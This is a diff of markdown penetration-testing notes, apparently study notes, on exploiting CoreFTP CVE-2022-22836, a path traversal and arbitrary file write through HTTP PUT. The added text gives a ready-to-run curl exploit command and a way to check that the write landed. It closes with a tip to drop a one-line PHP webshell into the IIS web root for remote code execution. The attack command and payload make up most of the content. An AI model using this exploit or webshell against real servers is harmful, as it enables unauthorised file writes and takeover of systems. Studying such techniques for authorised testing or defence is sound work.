@@ -1,19 +1,29 @@
-## Authenticated Path Traversal and Arbitrary File Write
+# CoreFTP CVE-2022-22836 — Path Traversal + Arbitrary File Write
 
-Identifying a CoreFTP instance prior to **build 727** where **authenticated** access is available and the service incorrectly processes **HTTP PUT** requests instead of the standard POST upload.
+CoreFTP before build 727. Authenticated. HTTP PUT request misprocessed → directory traversal → write files outside the FTP root.
 
-Execute a raw **HTTP PUT** request with directory traversal characters to write files outside of the authorized service folder.
+Single curl command — PUT request with path traversal sequences and content to write:
 
+```bash
+curl -k -X PUT -H "Host: <TARGET>" --basic -u <USER>:<PASS> --data-binary "<CONTENT>" --path-as-is https://<TARGET>/../../../../../../<OUTFILE>
 ```
-curl -k -X PUT -H "Host: <TARGET_IP>" --basic -u <USERNAME>:<PASSWORD> --data-binary "<FILE_CONTENT>" --path-as-is https://<TARGET_IP>/../../../../../../<FILE_PATH>
+
+`--path-as-is` prevents curl from normalizing the `../` sequences — required for the traversal to work.
+
+Verify the write landed:
+
+```cmd
+type C:\<OUTFILE>
 ```
 
-- **HTTP PUT** method enabled for file uploads.
-    
-- Service misinterprets user input, allowing breakout from restricted directories.
-    
-- **Build 727 or later** patches **CVE-2022-22836**, preventing the traversal.
-    
-- **Missing --path-as-is flag** causes cURL to collapse the traversal path before the request reaches the target.
-    
-- **Authentication failure** prevents the service from processing the file write.
+---
+
+## Attack Flow (Source → Process → Privileges → Destination)
+
+Phase 1 — Directory Traversal: user-supplied `../` path bypasses folder restriction because the application only checks whether the user is authorized to a specific folder, not whether the path escapes it.
+
+Phase 2 — Arbitrary File Write: once outside the restricted path, PUT request writes attacker-controlled content to attacker-chosen filename with no further restriction check.
+
+Combined result: authenticated write to any location the service account can reach on the filesystem. If the FTP service runs with elevated privileges or the web root is reachable from the FTP path → potential webshell drop → RCE.
+
+> [!tip] Any path traversal + file write on a web server → try writing a webshell to the web root. `--data-binary "<?php system($_GET['cmd']); ?>"` to `../../inetpub/wwwroot/shell.php`.
